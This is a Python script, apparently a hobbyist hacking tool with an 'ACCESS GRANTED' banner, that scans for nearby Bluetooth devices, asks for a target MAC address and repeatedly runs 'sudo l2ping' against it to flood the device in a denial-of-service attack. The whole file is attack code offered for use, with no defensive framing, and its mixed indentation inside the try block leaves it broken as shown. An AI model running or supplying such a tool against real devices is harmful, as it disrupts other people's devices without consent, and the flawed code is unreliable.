import subprocess
import threading

def scan():
        print("[+] Enabling bluetooth...")
        subprocess.run(["sudo", "hciconfig", "hci0", "up"])
        print("[+] Done!")
        print("[+] Scanning for MAC address...")
        subprocess.run(["hcitool", "scan"])
        print("[+] Done!")

def dos(MACaddress):
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])
        subprocess.run(["sudo", "l2ping", MACaddress])

try:
  print("""
 █████╗  ██████╗ ██████╗███████╗███████╗███████╗     ██████╗ ██████╗  █████╗ ███╗   ██╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║     ██║     █████╗  ███████╗███████╗    ██║  ███╗██████╔╝███████║██╔██╗ ██║   ██║   █████╗  ██║  ██║
██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║    ██║   ██║██╔══██╗██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██║  ██║
██║  ██║╚██████╗╚██████╗███████╗███████║███████║    ╚██████╔╝██║  ██║██║  ██║██║ ╚████║   ██║   ███████╗██████╔╝
╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═════╝ 
By Dinesh Sakthivel
""")
       scan()
       target = input("[+] Enter target MAC address: ")
       dos(target)
except KeyboardInterrupt:
        print("Quitting attack...")
